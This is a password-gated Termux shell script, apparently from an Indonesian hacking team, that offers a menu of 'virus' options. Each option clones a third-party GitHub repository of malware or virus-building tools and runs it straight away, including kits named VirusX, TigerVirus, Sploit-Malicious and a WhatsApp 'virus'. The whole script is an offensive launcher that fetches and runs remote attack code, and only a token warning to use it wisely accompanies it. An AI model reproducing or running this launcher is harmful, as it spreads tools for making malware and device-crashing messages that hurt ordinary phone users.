#!/bin/sh

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'


figlet LOGIN | lolcat
echo "=============================================" | lolcat
echo "[•]   Masukan passwordnya dulu stah :v    [•]"| lolcat
echo "=============================================" | lolcat
echo
read -p "Masukan password: " pass
if [ $pass = MR.15XCYBER ]
then
   echo "Password benar ✓✓✓" | lolcat
   echo
# pembersih teks
c=clear
$c # pembersih

# tampilan
figlet Walware | lolcat
echo "\033[35;1m[•]=========================================[•]"
echo "\033[36;1m[•] Creator : MR.15XCYBER & Mr.PatricX_404/ [•]"
echo "\033[36;1m[•] Team    : CYBER JATENG X-PLOIT TEAM     [•]"
echo "\033[36;1m[•] Github  : https://github.com/MrPatricX  [•]"
echo "\033[36;1m[•] Pesan   : Welcome to walware script     [•]"
echo "\033[35;1m[•]=========================================[•]"
echo "\033[31;1m[!]             !!! Warning !!!             [!]"
echo "[•]\033[35;1m=========================================[•]"
echo "\033[31;1m[•]      Gunaka tools ini dengan bijak      [•]"
echo "[•]\033[35;1m=========================================[•]"
echo "\033[31;1m[•]        Silahkan pilih menu walware      [•]"
echo "\033[35;1m[•]=========================================[•]"
echo "[1].virus-link"
echo "[2].virus vbug"
echo "[3].virus malicious"
echo "[4].virus X"
echo "[5].virus whatsapp"
echo "\033[35;1m[•]=========================================[•]"
read -p "pilih: " contoh
if [ $contoh = 1 ]
then
pkg update && pkg upgrade
pkg install git
pkg install figlet
pkg install ruby
pkg install python
pip install lolcat
gem install lolcat
git clone https://github.com/MrVirusSpm-07/link-virus
read -p "enter " ajab
cd link-virus
read -p "enter " ytka
sh download.sh
fi
if [ $contoh = 2 ]
then
pkg update && pkg upgrade
pkg install git
pkg install python
git clone https://github.com/Gameye98/vbug
read -p "enter " ajab
cd vbug
read -p "enter " ytka
python2 vbug.py
fi
if [ $contoh = 3 ]
then
termux-setup-storage
cd /sdcard
pkg install git
pkg install python2
pkg install ruby
gem install lolcat
git clone https://github.com/TheSploit/Sploit-Malicious
cd Sploit-Malicious
pip2 install -r requirements.txt
python2 malicious.py
fi
if [ $contoh = 4 ]
then
pkg update && pkg upgrade
pkg install git
pkg install python
git clone https://github.com/TSMaitry/VirusX.git
cd VirusX
chmod +x VirusX.py
python2 VirusX.py
fi
if [ $contoh = 5 ]
then
pkg update -y
pkg upgrade -y
pkg install git -y
git clone https://github.com/Devil-Tigers/TigerVirus.git
cd TigerVirus
bash TigerVirus.sh
fi
# then jika benar

else
  echo "Password salah mohon coba lagi !!!" | lolcat
# elae jika salah
fi

